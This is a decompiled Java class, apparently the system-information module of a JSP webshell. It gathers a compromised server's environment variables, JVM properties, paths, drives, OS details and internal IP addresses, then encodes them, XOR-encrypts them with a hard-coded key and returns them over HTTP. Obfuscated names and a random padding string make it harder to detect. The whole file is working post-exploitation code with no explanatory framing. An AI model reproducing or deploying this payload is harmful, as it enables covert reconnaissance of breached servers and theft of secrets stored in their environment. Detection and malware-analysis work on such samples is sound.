/*
 * Decompiled with CFR.
 */
package org.xey.sbkn.initrh;

import java.io.File;
import java.lang.Class;
import java.lang.Exception;
import java.lang.Integer;
import java.lang.Object;
import java.lang.String;
import java.lang.StringBuilder;
import java.lang.System;
import java.lang.Throwable;
import java.lang.reflect.Method;
import java.net.Inet4Address;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.util.Enumeration;
import java.util.HashMap;
import java.util.Map;
import java.util.Properties;
import java.util.Random;
import java.util.Set;

/*
 * This class specifies class file version 49.0 but uses Java 6 signatures.  Assumed Java 6.
 */
public class Nglbtz {
    public static String whatever;
    private Object Request;
    private Object Response;
    private Object Session;

    public Nglbtz() {
        whatever = "";
        whatever = whatever + "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";
    }

    /*
     * WARNING - Removed try catching itself - possible behaviour change.
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    public boolean equals(Object obj) {
        HashMap<String, String> result = new HashMap<String, String>();
        try {
            File[] roots;
            this.fillContext(obj);
            StringBuilder basicInfo = new StringBuilder("<br/><font size=2 color=red>环境变量:</font><br/>");
            Map<String, String> env = System.getenv();
            for (String name : env.keySet()) {
                basicInfo.append(name + "=" + env.get(name) + "<br/>");
            }
            basicInfo.append("<br/><font size=2 color=red>JRE系统属性:</font><br/>");
            Properties props = System.getProperties();
            Set entrySet = props.entrySet();
            for (Map.Entry entry : entrySet) {
                basicInfo.append(entry.getKey() + " = " + entry.getValue() + "<br/>");
            }
            String currentPath = new File("").getAbsolutePath();
            String driveList = "";
            for (File f : roots = File.listRoots()) {
                driveList = driveList + f.getPath() + ";";
            }
            String osInfo = System.getProperty("os.name") + System.getProperty("os.version") + System.getProperty("os.arch");
            HashMap<String, String> entity = new HashMap<String, String>();
            entity.put("basicInfo", basicInfo.toString());
            entity.put("currentPath", currentPath);
            entity.put("driveList", driveList);
            entity.put("osInfo", osInfo);
            entity.put("arch", System.getProperty("os.arch"));
            entity.put("localIp", this.getInnerIp());
            result.put("status", "success");
            result.put("msg", this.buildJson(entity, true));
        }
        catch (Exception so) {
            try {
                Object so2 = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
                Method write = so2.getClass().getMethod("write", byte[].class);
                write.invoke(so2, new Object[]{this.Encrypt(this.buildJson(result, true).getBytes("UTF-8"))});
                so2.getClass().getMethod("flush", new Class[0]).invoke(so2, new Object[0]);
                so2.getClass().getMethod("close", new Class[0]).invoke(so2, new Object[0]);
                return true;
            }
            catch (Exception exception) {
                return true;
            }
        }
        catch (Throwable throwable) {
            try {
                Object so = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
                Method write = so.getClass().getMethod("write", byte[].class);
                write.invoke(so, new Object[]{this.Encrypt(this.buildJson(result, true).getBytes("UTF-8"))});
                so.getClass().getMethod("flush", new Class[0]).invoke(so, new Object[0]);
                so.getClass().getMethod("close", new Class[0]).invoke(so, new Object[0]);
                throw throwable;
            }
            catch (Exception exception) {
                // empty catch block
            }
            throw throwable;
        }
        try {
            Object so = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
            Method write = so.getClass().getMethod("write", byte[].class);
            write.invoke(so, new Object[]{this.Encrypt(this.buildJson(result, true).getBytes("UTF-8"))});
            so.getClass().getMethod("flush", new Class[0]).invoke(so, new Object[0]);
            so.getClass().getMethod("close", new Class[0]).invoke(so, new Object[0]);
            return true;
        }
        catch (Exception so) {
            return true;
        }
    }

    private String getInnerIp() {
        String ips = "";
        try {
            Enumeration<NetworkInterface> netInterfaces = NetworkInterface.getNetworkInterfaces();
            InetAddress ip = null;
            while (netInterfaces.hasMoreElements()) {
                NetworkInterface netInterface = netInterfaces.nextElement();
                Enumeration<InetAddress> addresses = netInterface.getInetAddresses();
                while (addresses.hasMoreElements()) {
                    ip = addresses.nextElement();
                    if (ip == null || !(ip instanceof Inet4Address)) continue;
                    ips = ips + ip.getHostAddress() + " ";
                }
            }
        }
        catch (Exception exception) {
            // empty catch block
        }
        ips = ips.replace("127.0.0.1", "").trim();
        return ips;
    }

    private String buildJson(Map<String, String> entity, boolean encode) throws Exception {
        StringBuilder sb = new StringBuilder();
        String version = System.getProperty("java.version");
        sb.append("{");
        for (String key : entity.keySet()) {
            sb.append("\"" + key + "\":\"");
            String value = entity.get(key).toString();
            if (encode) {
                Object Encoder;
                Class<?> Base64;
                if (version.compareTo("1.9") >= 0) {
                    this.getClass();
                    Base64 = Class.forName("java.util.Base64");
                    Encoder = Base64.getMethod("getEncoder", null).invoke(Base64, null);
                    value = (String)Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, new Object[]{value.getBytes("UTF-8")});
                } else {
                    this.getClass();
                    Base64 = Class.forName("sun.misc.BASE64Encoder");
                    Encoder = Base64.newInstance();
                    value = (String)Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, new Object[]{value.getBytes("UTF-8")});
                    value = value.replace("\n", "").replace("\r", "");
                }
            }
            sb.append(value);
            sb.append("\",");
        }
        sb.setLength(sb.length() - 1);
        sb.append("}");
        return sb.toString();
    }

    private String base64encode(byte[] data) throws Exception {
        String result = "";
        String version = System.getProperty("java.version");
        try {
            this.getClass();
            Class<?> Base64 = Class.forName("java.util.Base64");
            Object Encoder = Base64.getMethod("getEncoder", null).invoke(Base64, null);
            result = (String)Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, new Object[]{data});
        }
        catch (Throwable error) {
            this.getClass();
            Class<?> Base64 = Class.forName("sun.misc.BASE64Encoder");
            Object Encoder = Base64.newInstance();
            result = (String)Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, new Object[]{data});
            result = result.replace("\n", "").replace("\r", "");
        }
        return result;
    }

    private void fillContext(Object obj) throws Exception {
        if (obj.getClass().getName().indexOf("PageContext") >= 0) {
            this.Request = obj.getClass().getMethod("getRequest", new Class[0]).invoke(obj, new Object[0]);
            this.Response = obj.getClass().getMethod("getResponse", new Class[0]).invoke(obj, new Object[0]);
            this.Session = obj.getClass().getMethod("getSession", new Class[0]).invoke(obj, new Object[0]);
        } else {
            Map objMap = (Map)obj;
            this.Session = objMap.get("session");
            this.Response = objMap.get("response");
            this.Request = objMap.get("request");
        }
        this.Response.getClass().getMethod("setCharacterEncoding", String.class).invoke(this.Response, "UTF-8");
    }

    private byte[] getMagic() throws Exception {
        String key = this.Session.getClass().getMethod("getAttribute", String.class).invoke(this.Session, "u").toString();
        int magicNum = Integer.parseInt(key.substring(0, 2), 16) % 16;
        Random random = new Random();
        byte[] buf = new byte[magicNum];
        for (int i = 0; i < buf.length; ++i) {
            buf[i] = (byte)random.nextInt(256);
        }
        return buf;
    }

    private byte[] Encrypt(byte[] byArray) throws Exception {
        String string = "e45e329feb5d925b";
        for (int i = 0; i < byArray.length; ++i) {
            byArray[i] = (byte)(byArray[i] ^ string.getBytes()[i + 1 & 0xF]);
        }
        return byArray;
    }
}
